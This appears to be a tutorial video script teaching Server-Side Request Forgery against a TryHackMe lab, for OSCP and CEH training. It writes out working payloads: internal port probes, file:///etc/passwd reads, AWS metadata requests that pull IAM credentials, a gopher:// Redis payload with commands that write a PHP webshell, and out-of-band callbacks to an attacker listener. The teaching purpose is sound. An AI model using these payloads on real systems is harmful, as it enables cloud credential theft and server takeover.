# VIDEO 33: Server-Side Request Forgery (SSRF)
### Internal Service Access, Cloud Metadata & Protocol Smuggling
**Suggested length:** 14–18 minutes
**License Tier:** Free
**Certification Relevance:** OSCP: Web Application Attacks | CEH: Web Application Hacking

---

> ⚠️ **SAFETY WARNING:** All demonstrations in this video use the TryHackMe "SSRF" room — an isolated lab environment designed for learning. SSRF attacks against systems without explicit written authorization is illegal and unethical. Cloud metadata access in unauthorized environments can expose credentials that lead to full cloud account compromise. Never use these techniques outside of authorized penetration tests or dedicated practice labs.

---

## INTRO (0:00 – 1:45)

**[Screen: Huginn splash screen with Section 5 title card "Web Application Exploitation"]**

> "Welcome back to the Huginn tutorial series. This video covers Server-Side Request Forgery — SSRF — a vulnerability that turns the web server into your proxy. When an application fetches resources based on user-supplied URLs without proper validation, you can redirect those requests to internal services, cloud metadata endpoints, and infrastructure that's never meant to be accessed from the outside. SSRF has been responsible for some of the largest cloud breaches in recent years, including the Capital One breach where SSRF against a WAF led to AWS metadata access and the exfiltration of 100 million customer records."

**[Screen: Slide showing SSRF concept — attacker → web app → internal network / cloud metadata / localhost services]**

> "The core concept is simple: instead of the server fetching an external resource like an image or URL preview, you make it fetch internal resources — localhost services on ports that aren't exposed externally, private IP ranges, and critically, cloud metadata endpoints that serve temporary credentials. We'll demonstrate all of this using the TryHackMe SSRF room, covering internal port scanning, AWS metadata access at 169.254.169.254, protocol smuggling, and blind SSRF detection. This builds on our HTTP fundamentals from Video 10 (see Video 10: HTTP/S Fingerprinting) and the injection methodology from Video 28 (see Video 28: SQL Injection)."

---

## SECTION 1: SSRF Fundamentals (1:45 – 4:00)

**[Screen: Diagram showing normal application flow — user provides URL → server fetches external resource → returns result]**

> "SSRF targets any functionality where the server makes HTTP requests based on user input. Common examples: URL preview features that show a thumbnail of a linked page, PDF generators that render HTML from a URL, webhook configurations that POST to a user-specified endpoint, image import from URL, and XML parsers that resolve external entities. Any time the server acts as an HTTP client with user-controlled destination, SSRF is possible."

**[Screen: Diagram showing SSRF exploitation — user provides internal URL → server fetches internal resource → leaks data back to attacker]**

> "The exploitation path: provide an internal URL instead of an external one. The server dutifully fetches it — because from the server's perspective, it's just making an HTTP request. The server has network access to internal resources that the attacker doesn't. This creates a tunnel through the web application into the internal network."

**[Screen: Table showing SSRF targets — localhost services, internal IPs, cloud metadata, file:// protocol]**

> "High-value SSRF targets fall into four categories. First: localhost services — Redis on port 6379, Elasticsearch on 9200, internal admin panels on non-standard ports. Second: private IP ranges — 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 — other servers on the internal network. Third: cloud metadata services at 169.254.169.254 — the link-local address used by AWS, GCP, and Azure to serve instance metadata and temporary credentials. Fourth: alternative protocols like file://, gopher://, and dict:// that can access local files or speak to services using non-HTTP protocols."

```
# SSRF target categories:
# 1. Localhost services
http://127.0.0.1:6379/        # Redis
http://localhost:9200/         # Elasticsearch
http://127.0.0.1:8080/admin   # Internal admin panel

# 2. Internal network
http://10.0.0.1/              # Internal gateway
http://192.168.1.1/           # Network infrastructure
http://172.16.0.100:3306/     # Internal database

# 3. Cloud metadata
http://169.254.169.254/latest/meta-data/   # AWS
http://metadata.google.internal/            # GCP
http://169.254.169.254/metadata/instance   # Azure

# 4. Alternative protocols
file:///etc/passwd            # Local file read
gopher://127.0.0.1:6379/     # Protocol smuggling
dict://127.0.0.1:6379/INFO   # Service enumeration
```

---

## SECTION 2: Huginn SSRF Testing Interface (4:00 – 5:45)

**[Screen: Huginn application — navigating to Web Exploits → SSRF Testing module]**

> "Open Huginn and navigate to the SSRF testing module under Web Exploits. Huginn provides two complementary tools: the SSRFTester class for active exploitation and the RedirectSSRFDetector for identifying potential SSRF attack surfaces during reconnaissance."

**[Screen: SSRF Testing interface showing target URL, parameter detection, payload categories, and results]**

> "The SSRFTester works by analyzing discovered form parameters for URL-accepting fields. It looks for parameter names containing keywords like 'url', 'redirect', 'next', 'link', 'site', 'goto', and 'target'. When it finds candidates, it injects SSRF payloads from multiple categories: cloud metadata endpoints, localhost ports, internal IPs, and file protocol access."

**[Screen: RedirectSSRFDetector panel — showing detected URL parameters and candidate SSRF surfaces]**

> "The RedirectSSRFDetector provides the reconnaissance layer. It scans all discovered parameters and links for redirect functionality — parameters that might accept URLs. It also parses page content looking for href attributes with redirect parameters embedded in links. This surfaces the attack surface before you start active testing."

**[Screen: Payload configuration — showing cloud metadata payloads for AWS/GCP/Azure, localhost scan range, and protocol options]**

> "The payload configuration is organized by target type. Cloud metadata payloads target AWS, GCP, and Azure endpoints specifically. The localhost scanner probes common service ports. The response analyzer checks for metadata service signatures — 'ami-id' for AWS, 'computeMetadata' for GCP — confirming successful SSRF automatically."

---

## SECTION 3: THM SSRF Room Setup (5:45 – 7:15)

**[Screen: TryHackMe interface — joining the "SSRF" room → deploying the target machine]**

> "For our demonstration, we'll use the TryHackMe SSRF room. This provides a purpose-built vulnerable application with intentional SSRF endpoints and simulated internal services including a metadata endpoint. Log into TryHackMe, join the SSRF room, and deploy the target machine. Note the target IP address assigned to your instance."

```
Platform: TryHackMe
Room: SSRF
Target IP: MACHINE_IP (assigned on deploy)
Expected Services: HTTP (port 80), internal services on various ports
VPN Required: TryHackMe OpenVPN connection active
```

**[Screen: Accessing the target web application in browser — showing a URL fetcher/preview feature]**

> "Once the machine is deployed and your VPN is connected, access the target application in your browser. The room typically presents a web application with URL-fetching functionality — perhaps a link preview feature, a PDF generator, or an image import from URL. The key is identifying where the application makes server-side HTTP requests based on your input."

**[Screen: Identifying the SSRF-vulnerable parameter in the application — URL input field highlighted]**

> "Look at the application's functionality. There's a feature that accepts a URL and fetches its content — this is our injection point. Let's first confirm it works normally by providing a legitimate external URL, then pivot to internal targets."

---

## SECTION 4: Internal Port Scanning via SSRF (7:15 – 9:30)

**[Screen: Testing SSRF against localhost on different ports — http://localhost:22, http://localhost:80, http://localhost:8080]**

> "The first exploitation technique is using SSRF as a port scanner. We can determine which services run on the server locally — services that aren't exposed to the network. Request 'http://localhost:22' — if SSH is running, you'll get a connection or a banner. Request 'http://localhost:3306' — a MySQL banner. Different response codes and timing reveal what's listening."

```bash
# Internal port scanning via SSRF
# Submit each URL through the vulnerable parameter:

http://127.0.0.1:22     → Response: SSH-2.0-OpenSSH_8.2 (SSH running)
http://127.0.0.1:80     → Response: 200 OK (Web server - expected)
http://127.0.0.1:3306   → Response: MySQL banner (Database exposed locally)
http://127.0.0.1:6379   → Response: -ERR wrong number... (Redis exposed!)
http://127.0.0.1:8080   → Response: 200 OK (Internal admin panel!)
http://127.0.0.1:9200   → Response: Elasticsearch cluster info
http://127.0.0.1:5432   → Response: Connection refused (PostgreSQL not running)
```

**[Screen: Response analysis — different responses for open vs closed ports]**

> "Notice the response patterns. Open ports return service-specific data — SSH banners, database handshakes, web page content. Closed ports return connection refused errors. Filtered ports might time out. By sweeping common ports, you build a map of the server's local service landscape — services that were invisible from an external port scan."

**[Screen: Discovering an internal admin panel on port 8080 via SSRF]**

> "Here's the payoff: port 8080 returns a full HTML page — an internal administration panel that's only bound to localhost. It's not accessible from outside, but through SSRF we can interact with it. This is how SSRF turns a web vulnerability into internal network access."

```bash
# Accessing internal admin panel via SSRF
URL submitted: http://127.0.0.1:8080/admin

# Response reveals:
# Internal Administration Panel
# - System Status: Running
# - Database Connection: Active
# - User Management: /admin/users
# - Configuration: /admin/config
```

**[Screen: Scanning private IP ranges — http://10.0.0.1, http://192.168.1.1, discovering other internal hosts]**

> "Beyond localhost, scan the internal network. Try common gateway addresses — 10.0.0.1, 192.168.1.1, 172.16.0.1. In cloud environments, other instances on the same VPC often communicate via private IPs. Each responding host is a potential pivot point accessible only through your SSRF tunnel."

---

## SECTION 5: Cloud Metadata Access (9:30 – 12:00)

**[Screen: Slide explaining cloud metadata service — "169.254.169.254: The most dangerous IP in cloud computing"]**

> "Now for the most impactful SSRF target: cloud metadata services. Every major cloud provider — AWS, GCP, Azure — runs a metadata service at the link-local address 169.254.169.254. This service provides instance information, configuration, and critically, temporary security credentials to the running instance. It's only accessible from the instance itself — unless SSRF gives you a tunnel in."

**[Screen: SSRF request to http://169.254.169.254/latest/meta-data/ — showing AWS metadata directory listing]**

> "Submit the AWS metadata base URL through the SSRF vulnerability: 'http://169.254.169.254/latest/meta-data/'. If the application is running on AWS, you'll get a directory listing of available metadata categories."

```bash
# AWS Metadata - Initial directory listing
URL submitted: http://169.254.169.254/latest/meta-data/

# Response:
ami-id
ami-launch-index
ami-manifest-path
hostname
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
network/
placement/
public-hostname
public-ipv4
security-groups
iam/
```

**[Screen: Navigating deeper — requesting IAM credentials from metadata]**

> "The 'iam/' directory is the critical target. Navigate to 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' to list available IAM roles, then request the specific role to receive temporary AWS credentials."

```bash
# Step 1: List IAM roles attached to the instance
URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Response:
ec2-ssrf-demo-role

# Step 2: Request credentials for the role
URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-ssrf-demo-role

# Response:
{
  "Code": "Success",
  "LastUpdated": "2024-01-15T10:30:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJal...",
  "Token": "IQoJ...",
  "Expiration": "2024-01-15T16:30:00Z"
}
```

**[Screen: Showing extracted AWS credentials — AccessKeyId, SecretAccessKey, Token]**

> "There they are — temporary AWS credentials including an access key, secret key, and session token. With these credentials, an attacker can authenticate to AWS APIs with whatever permissions the EC2 instance role has. If that role has S3 access, they can dump buckets. If it has IAM permissions, they can create new users. This was the exact attack path in the Capital One breach — SSRF through a WAF led to metadata credentials that accessed S3 buckets containing customer data."

**[Screen: Additional metadata endpoints — user-data (startup scripts often contain secrets)]**

> "Other valuable metadata endpoints: '/latest/user-data/' returns the instance's startup script — these frequently contain hardcoded credentials, database connection strings, or API keys that the instance needs during boot. '/latest/dynamic/instance-identity/document' reveals the account ID, region, and instance details."

```bash
# User data (startup script - often contains secrets)
URL: http://169.254.169.254/latest/user-data/

# Response might contain:
#!/bin/bash
export DB_PASSWORD="production_password_123"
export API_KEY="sk-live-abc123..."
aws s3 cp s3://config-bucket/app.conf /etc/app/
```

---

## SECTION 6: Protocol Smuggling (12:00 – 14:00)

**[Screen: Slide explaining protocol smuggling — "Using gopher:// and dict:// to speak non-HTTP protocols through SSRF"]**

> "Basic SSRF uses HTTP to communicate with internal services. But many backend services don't speak HTTP — Redis uses its own text protocol, SMTP has its own commands, memcached has its own format. Protocol smuggling uses the gopher:// URI scheme to send arbitrary bytes to any TCP port, effectively speaking any protocol through the SSRF vulnerability."

**[Screen: Demonstrating gopher:// against internal Redis — sending Redis commands via SSRF]**

> "The gopher:// protocol lets you specify raw data to send to a host and port. Against Redis on localhost:6379, you can send Redis commands to read or write data, set keys, or even write a webshell to disk if Redis has filesystem access."

```bash
# Protocol smuggling via gopher:// to Redis
# Redis command: INFO (get server information)
URL: gopher://127.0.0.1:6379/_INFO%0D%0AQUIT%0D%0A

# Response contains Redis server information:
# redis_version:6.0.9
# connected_clients:2
# used_memory:1024000
# ...

# Write a webshell via Redis (if Redis runs as root - LAB ONLY):
# SET key "<?php system($_GET['cmd']); ?>"
# CONFIG SET dir /var/www/html/
# CONFIG SET dbfilename shell.php
# SAVE
```

**[Screen: Demonstrating dict:// protocol for service enumeration]**

> "The dict:// protocol is simpler — it sends a single command to a port and returns the response. Useful for quick service fingerprinting without the complexity of gopher encoding."

```bash
# Service enumeration via dict:// protocol
URL: dict://127.0.0.1:6379/INFO

# Response: Redis server information

URL: dict://127.0.0.1:11211/stats

# Response: Memcached statistics (if running)
```

**[Screen: Slide showing defensive implications — why blocking only http:// isn't sufficient]**

> "This is why SSRF defenses that only block http:// and https:// are insufficient. The gopher://, dict://, file://, and ftp:// protocols all enable different attack paths. Effective SSRF protection requires a whitelist approach — only allow specific, known-safe destination URLs rather than trying to blacklist dangerous ones."

---

## SECTION 7: Blind SSRF Detection (14:00 – 16:00)

**[Screen: Slide explaining blind SSRF — "No response content visible, but the request is made"]**

> "In blind SSRF, the application makes the server-side request but doesn't show you the response. The page might just display 'URL processed successfully' regardless of what the server received back. You know the request happened, but you can't read the response content. This requires different detection and exploitation techniques."

**[Screen: Out-of-band detection — using a callback server to confirm SSRF]**

> "The primary detection method for blind SSRF is out-of-band callbacks. Submit a URL pointing to infrastructure you control — a Burp Collaborator endpoint, a webhook.site URL, or your own HTTP listener. If you receive a connection, blind SSRF is confirmed. The incoming request's headers often reveal the server's internal IP and software version."

```bash
# Blind SSRF detection via out-of-band callback

# Option 1: Burp Collaborator
URL submitted: http://your-collaborator-id.burpcollaborator.net/ssrf-test

# Option 2: webhook.site
URL submitted: http://webhook.site/your-unique-id

# Option 3: Custom listener
# On your machine: nc -lvnp 8888
URL submitted: http://YOUR_VPN_IP:8888/ssrf-proof

# If your listener receives a connection:
# GET /ssrf-proof HTTP/1.1
# Host: YOUR_VPN_IP:8888
# User-Agent: Python-urllib/3.8  ← reveals server-side HTTP client
# X-Forwarded-For: 10.10.10.50  ← reveals internal IP
```

**[Screen: Exploiting blind SSRF — time-based detection and DNS-based exfiltration]**

> "Even without a callback server, time-based detection works. Request internal IPs — open ports respond quickly, closed ports hang or timeout. The response time difference confirms which hosts and ports are alive, building an internal network map through timing alone."

```bash
# Time-based blind SSRF port detection:
http://127.0.0.1:22    → Response in 50ms (port open)
http://127.0.0.1:23    → Response in 5000ms timeout (port closed)
http://127.0.0.1:80    → Response in 45ms (port open)
http://127.0.0.1:3306  → Response in 60ms (port open)
http://127.0.0.1:9999  → Response in 5000ms timeout (port closed)
```

**[Screen: Huginn SSRF scanner results — showing confirmed blind SSRF via timeout analysis]**

> "Huginn's SSRFTester includes timeout-based detection automatically. When a payload targeting localhost causes a timeout — particularly for ports that should be closed — it reports 'Potential SSRF (Timeout)' at MEDIUM severity. This indicates the server attempted the connection even though no response content was visible. Combined with out-of-band callbacks, you can confirm and escalate blind SSRF to full exploitation."

---

## SECTION 8: Certification Mapping and Practice (16:00 – 17:00)

**[Screen: Certification mapping — OSCP: Web Application Attacks (SSRF), CEH: Module 14 — Web Application Hacking]**

> "SSRF maps to the OSCP Web Application Attacks domain. While SSRF wasn't historically common on OSCP, the updated exam and recent Proving Grounds machines increasingly feature it — particularly SSRF to metadata access in cloud-hosted targets. For CEH, SSRF falls under Module 14 — Hacking Web Applications — covering server-side attacks and API abuse."

**[Screen: Practice resources — THM "SSRF" room, HackTheBox machines, PortSwigger Web Security Academy]**

> "For practice, complete the TryHackMe SSRF room we demonstrated today. The PortSwigger Web Security Academy has excellent SSRF labs covering basic SSRF, blind SSRF, and filter bypasses. On Hack The Box, machines like 'Forge' and 'Mentorquotes' feature SSRF as core attack vectors. Practice the full methodology: identify URL-fetching functionality, test internal targets, attempt metadata access, and explore protocol smuggling."

---

## OUTRO (17:00 – end)

**[Screen: Summary slide — SSRF: Internal Port Scanning, Cloud Metadata (169.254.169.254), Protocol Smuggling (gopher://), Blind Detection (OOB callbacks) | Next: Video 34 — Deserialization Attacks]**

> "That's Server-Side Request Forgery in Huginn. We covered how SSRF turns the server into a proxy for accessing internal services, demonstrated cloud metadata credential theft at 169.254.169.254, explored protocol smuggling with gopher:// to speak non-HTTP protocols through SSRF, and learned blind SSRF detection through out-of-band callbacks and timing analysis. In the next video, we'll cover deserialization attacks — exploiting how applications reconstruct objects from serialized data to achieve remote code execution. See you there."
